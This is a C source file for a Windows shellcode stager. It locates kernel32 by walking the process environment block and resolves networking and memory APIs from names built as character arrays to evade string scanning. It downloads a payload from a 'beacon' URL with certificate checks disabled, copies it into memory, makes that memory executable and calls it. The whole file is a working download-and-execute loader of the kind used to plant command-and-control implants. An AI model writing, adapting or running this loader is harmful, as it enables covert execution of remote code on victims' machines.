#include "head.h"
#include <intrin.h>

__declspec(noinline) ULONG_PTR caller(VOID);

void StartingPoint() {
    BYTE Kernel32[] = kernel32dll;
    BYTE Wininet[] = wininetdll;
    BYTE LoadLibraryA_Func[] = var10;
    BYTE read[] = var1;
    BYTE openurl[] = var2;
    BYTE internetOpen[] = var3;
    BYTE Vir[] = var5;
    BYTE VirProtect[] = var6;

    BYTE HttpQueryInfoA_Func[] = { 'H','t','t','p','Q','u','e','r','y','I','n','f','o','A',0 };
    BYTE InternetCloseHandle_Func[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0 };

#if defined(_AMD64_)
    ULONG_PTR dwKernelBase = GetKernel32DLL((ULONG_PTR)((PPEB_LDR_DATA)((_PPEB)__readgsqword(0x60))->pLdr)->InMemoryOrderModuleList.Flink);
#else
    ULONG_PTR dwKernelBase = GetKernel32DLL((ULONG_PTR)((PPEB_LDR_DATA)((_PPEB)__readfsdword(0x30))->pLdr)->InMemoryOrderModuleList.Flink);
#endif

    FN_GetProcAddress fn_GetProcAddress = (FN_GetProcAddress)GetProcAddress_Func(dwKernelBase);
    FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress((HMODULE)dwKernelBase, (LPCSTR)LoadLibraryA_Func);

    HMODULE kernel32DLLAddr = fn_LoadLibraryA((LPCSTR)Kernel32);
    HMODULE winNetDllAddr = fn_LoadLibraryA((LPCSTR)Wininet);

    FN_InternetOpenA TOpen = (FN_InternetOpenA)fn_GetProcAddress(winNetDllAddr, (LPCSTR)internetOpen);
    FN_InternetOpenUrlA TOpenUrlA = (FN_InternetOpenUrlA)fn_GetProcAddress(winNetDllAddr, (LPCSTR)openurl);
    FN_InternetReadFile TReadFile = (FN_InternetReadFile)fn_GetProcAddress(winNetDllAddr, (LPCSTR)read);
    FN_VirtualAlloc TVirtualAlloc = (FN_VirtualAlloc)fn_GetProcAddress(kernel32DLLAddr, (LPCSTR)Vir);
    FN_VirtualProtect TVirtualProtect = (FN_VirtualProtect)fn_GetProcAddress(kernel32DLLAddr, (LPCSTR)VirProtect);


    FN_HttpQueryInfoA THttpQueryInfoA = (FN_HttpQueryInfoA)fn_GetProcAddress(winNetDllAddr, (LPCSTR)HttpQueryInfoA_Func);
    FN_InternetCloseHandle TInternetCloseHandle = (FN_InternetCloseHandle)fn_GetProcAddress(winNetDllAddr, (LPCSTR)InternetCloseHandle_Func);

    BYTE url[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '2', '7', '.', '0', '.', '0', '.', '1', ':', '8', '1', '8', '1', '/', 'b', 'e', 'a', 'c', 'o', 'n', 0 };
    DWORD dwFlags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | 0x80000000 | 0x400;

    HINTERNET session = TOpenUrlA(TOpen((LPCSTR)0, 0, NULL, 0, NULL), (LPCSTR)url, NULL, 0, dwFlags, 0);

    if (session) {

        DWORD contentLength = 0;
        char buffer[64];
        DWORD bufferLength = sizeof(buffer);

        if (THttpQueryInfoA(session, HTTP_QUERY_CONTENT_LENGTH, buffer, &bufferLength, NULL)) {

            contentLength = 0;
            for (char* p = buffer; *p >= '0' && *p <= '9'; p++) {
                contentLength = contentLength * 10 + (*p - '0');
            }
        }

        if (contentLength > 0) {
            unsigned char* addr = (unsigned char*)TVirtualAlloc(0, contentLength, MEM_COMMIT, PAGE_READWRITE);
            if (addr) {
                DWORD bytes_read;
                DWORD total_bytes = 0;

                while (total_bytes < contentLength) {
                    if (!TReadFile(session, addr + total_bytes, contentLength - total_bytes, &bytes_read)) {
                        break;
                    }
                    if (bytes_read == 0) break;
                    total_bytes += bytes_read;
                }

                DWORD oldProtect;
                if (TVirtualProtect(addr, contentLength, PAGE_EXECUTE_READ, &oldProtect)) {
                    ((void(*)())addr)();
                }
            }
        }
        TInternetCloseHandle(session);
    }
    return;
}

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }
